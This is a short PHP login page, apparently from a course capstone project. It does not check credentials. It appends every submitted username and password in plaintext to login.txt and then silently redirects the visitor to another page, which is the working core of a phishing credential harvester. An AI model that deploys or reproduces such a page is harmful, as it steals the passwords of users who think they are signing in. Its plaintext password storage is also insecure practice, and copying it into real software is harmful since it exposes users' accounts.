<html>
 <head>
  <title>Login</title>
 </head>
 <body>

<?php

if ($_POST['Login']){

$myFile = "login.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_POST['username'] . ":";
fwrite($fh, $stringData);
$stringData = $_POST['password'] . "\n";
fwrite($fh, $stringData);
fclose($fh);

} ?>

<script>location.href="/cs490-capstone/index.html#";</script>
	 
 </body>
</html>